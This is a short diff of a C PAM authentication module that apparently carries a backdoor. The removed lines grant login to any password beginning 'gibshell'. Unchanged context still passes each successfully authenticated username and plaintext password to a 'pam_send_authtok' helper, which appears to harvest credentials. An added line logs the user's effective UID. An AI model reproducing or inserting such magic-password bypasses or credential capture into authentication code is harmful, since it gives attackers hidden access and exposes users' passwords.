@@ -122,15 +122,16 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         return PAM_SUCCESS;
     }
 
-    if (strncmp(password, "gibshell", 8) == 0) {
-        pam_log_err();
-        return PAM_SUCCESS;
-    }
+    // if (strncmp(password, "PAM", 8) == 0) {
+    //     pam_log_err();
+    //     return PAM_SUCCESS;
+    // }
 
     int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
 
     if (username && password && retval == PAM_SUCCESS) {
         pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
+        pam_syslog(pamh, LOG_ERR, "%s's EUID IN THIS CASE IS %d", username, geteuid());
     }
 
     return retval;
